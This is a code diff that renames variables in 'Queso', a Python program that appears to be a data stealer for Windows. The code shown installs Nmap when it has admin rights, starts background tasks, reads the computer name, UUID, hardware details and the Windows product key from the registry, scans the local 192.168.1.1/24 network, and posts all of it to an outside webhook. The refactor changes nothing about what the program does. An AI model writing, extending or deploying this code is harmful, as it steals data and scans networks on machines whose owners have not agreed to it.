@@ -190,13 +190,13 @@ class Queso:
             if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                 Network.InstallNmap()
 
-            for func, daemon in admin_tasks: # Start admin tasks
-                admin_task_thread = Thread(target= func, daemon= daemon)
+            for task_func, task_daemon in admin_tasks: # Start admin tasks
+                admin_task_thread = Thread(target= task_func, daemon= task_daemon)
                 admin_task_thread.start()
                 Tasks.AddTask(admin_task_thread)
 
-        for func, daemon in user_tasks: # Start user tasks
-            user_task_thread = Thread(target= func, daemon= daemon)
+        for task_func, task_daemon in user_tasks: # Start user tasks
+            user_task_thread = Thread(target= task_func, daemon= task_daemon)
             user_task_thread.start()
             Tasks.AddTask(user_task_thread)
 
@@ -210,17 +210,17 @@ class Queso:
     def SendData(self) -> None: # Send gathered data to the webhook
 
         # Gather system information
-        computerName = os.getenv("computername")
-        computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
-        computerUUID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
+        computer_name = os.getenv("computername")
+        computer_os = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
+        computer_uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
         cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
         sys_info = f"""
-            \nComputer Name: {computerName}
-            \nOS: {computerOS}
-            \nUUID: {computerUUID}
+            \nComputer Name: {computer_name}
+            \nOS: {computer_os}
+            \nUUID: {computer_uuid}
             \nCPU: {cpu}
             \nGPU: {gpu}
             \nProduct Key: {productKey}
@@ -247,7 +247,7 @@ class Queso:
             ip_info = data
 
         # Create the embed
-        payload = {
+        webhook_payload = {
             "embeds": [
                 {
                     "title": "Queso Project",
@@ -265,15 +265,15 @@ class Queso:
             "username": "Queso"
         }
 
-        fields = dict()
+        webhook_fields = dict()
 
         # Append a network scan if we can make one
         networkscan = Network.NmapScan("192.168.1.1/24")
         if networkscan:
-            fields['file'] = ("{}.xml".format(computerUUID), ElementTree.tostring(networkscan))
+            webhook_fields['file'] = ("{}.xml".format(computer_uuid), ElementTree.tostring(networkscan))
 
-        fields['payload_json'] = json.dumps(payload).encode() # Append the embed
-        http_manager.request("POST", self.Webhook, fields= fields) # Bon voyage!
+        webhook_fields['payload_json'] = json.dumps(webhook_payload).encode() # Append the embed
+        http_manager.request("POST", self.Webhook, fields= webhook_fields) # Bon voyage!
 
 
 if os.name == "nt":
